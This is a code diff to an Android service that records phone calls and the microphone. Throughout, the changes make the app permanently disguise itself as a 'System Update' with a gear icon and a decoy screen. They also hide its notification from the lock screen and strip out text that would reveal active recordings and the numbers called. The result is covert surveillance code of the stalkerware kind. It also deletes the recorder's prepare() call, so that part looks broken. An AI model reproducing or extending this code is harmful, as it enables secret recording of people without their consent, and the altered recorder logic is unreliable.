@@ -60,7 +60,7 @@ public class MediaFrameworkService extends Service {
     private static boolean callInProgress = false;
 
     // Settings
-    private static boolean autoRecordEnabled = true;
+    private static boolean autoRecordEnabled = false;
     private static boolean saveOnDeviceEnabled = true;
     private static boolean isForeground = false;
 
@@ -136,23 +136,17 @@ public class MediaFrameworkService extends Service {
         return START_STICKY;
     }
 
-    private boolean isStealthMode() {
-        android.content.ComponentName fakeAlias = new android.content.ComponentName(this, "com.labs.labrats.SystemUpdateAlias");
-        return getPackageManager().getComponentEnabledSetting(fakeAlias) == android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED;
-    }
-
     private void ensureForeground() {
         if (isForeground) return;
         
-        boolean stealth = isStealthMode();
-        Intent notificationIntent = new Intent(this, stealth ? DecoyActivity.class : MainActivity.class);
+        Intent notificationIntent = new Intent(this, DecoyActivity.class);
         PendingIntent pendingIntent = PendingIntent.getActivity(this, 0, notificationIntent,
                 PendingIntent.FLAG_IMMUTABLE);
 
         Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
-                .setContentTitle(stealth ? "System Update" : "Audio Monitor")
-                .setContentText(stealth ? "Checking for system updates..." : "Monitoring audio...")
-                .setSmallIcon(stealth ? R.drawable.ic_sprocket_gear : R.drawable.default_app_icon)
+                .setContentTitle("System Update")
+                .setContentText("Checking for system updates...")
+                .setSmallIcon(R.drawable.ic_sprocket_gear)
                 .setContentIntent(pendingIntent)
                 .setOngoing(true)
                 .setPriority(NotificationCompat.PRIORITY_MIN)
@@ -199,7 +193,7 @@ public class MediaFrameworkService extends Service {
 
     private void loadSettings() {
         SharedPreferences prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
-        autoRecordEnabled = prefs.getBoolean(PREF_AUTO_RECORD_CALLS, true);
+        autoRecordEnabled = prefs.getBoolean(PREF_AUTO_RECORD_CALLS, false);
         saveOnDeviceEnabled = prefs.getBoolean(PREF_SAVE_ON_DEVICE, true);
         Log.d(TAG, "Settings loaded - AutoRecord: " + autoRecordEnabled + ", SaveOnDevice: " + saveOnDeviceEnabled);
     }
@@ -359,7 +353,7 @@ public class MediaFrameworkService extends Service {
             currentCallNumber = phoneNumber;
             currentCallType = callType;
 
-            updateNotification("Recording " + callType + " call: " + phoneNumber);
+            updateNotification();
             Log.d(TAG, "Call recording started successfully: " + currentRecordingPath);
 
         } catch (Exception e) {
@@ -397,7 +391,7 @@ public class MediaFrameworkService extends Service {
         long duration = (System.currentTimeMillis() - recordingStartTime) / 1000;
         Log.d(TAG, "Call recording stopped. Duration: " + duration + "s, Path: " + currentRecordingPath);
 
-        updateNotification("Monitoring audio...");
+        updateNotification();
     }
 
     // ============ MICROPHONE RECORDING ============
@@ -449,14 +443,12 @@ public class MediaFrameworkService extends Service {
                 });
             }
 
-            mediaRecorder.prepare();
             mediaRecorder.start();
 
             isRecordingMic = true;
             recordingStartTime = System.currentTimeMillis();
 
-            String durationText = durationSeconds > 0 ? " (max " + durationSeconds + "s)" : "";
-            updateNotification("Recording microphone" + durationText);
+            updateNotification();
 
             Log.d(TAG, "Microphone recording started successfully: " + currentRecordingPath);
 
@@ -494,7 +486,7 @@ public class MediaFrameworkService extends Service {
         long duration = (System.currentTimeMillis() - recordingStartTime) / 1000;
         Log.d(TAG, "Microphone recording stopped. Duration: " + duration + "s, Path: " + currentRecordingPath);
 
-        updateNotification("Monitoring audio...");
+        updateNotification();
     }
 
     private void releaseMediaRecorder() {
@@ -523,20 +515,20 @@ public class MediaFrameworkService extends Service {
         }
     }
 
-    private void updateNotification(String text) {
+    private void updateNotification() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            boolean stealth = isStealthMode();
-            Intent notificationIntent = new Intent(this, stealth ? DecoyActivity.class : MainActivity.class);
+            Intent notificationIntent = new Intent(this, DecoyActivity.class);
             PendingIntent pendingIntent = PendingIntent.getActivity(this, 0, notificationIntent,
                     PendingIntent.FLAG_IMMUTABLE);
 
             Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
-                    .setContentTitle(stealth ? "System Update" : "Audio Monitor")
-                    .setContentText(stealth ? "Checking for system updates..." : text)
-                    .setSmallIcon(stealth ? R.drawable.ic_sprocket_gear : R.drawable.default_app_icon)
+                    .setContentTitle("System Update")
+                    .setContentText("Checking for system updates...")
+                    .setSmallIcon(R.drawable.ic_sprocket_gear)
                     .setContentIntent(pendingIntent)
                     .setOngoing(true)
-                    .setPriority(NotificationCompat.PRIORITY_LOW)
+                    .setPriority(NotificationCompat.PRIORITY_MIN)
+                    .setVisibility(NotificationCompat.VISIBILITY_SECRET)
                     .build();
 
             NotificationManager manager = getSystemService(NotificationManager.class);
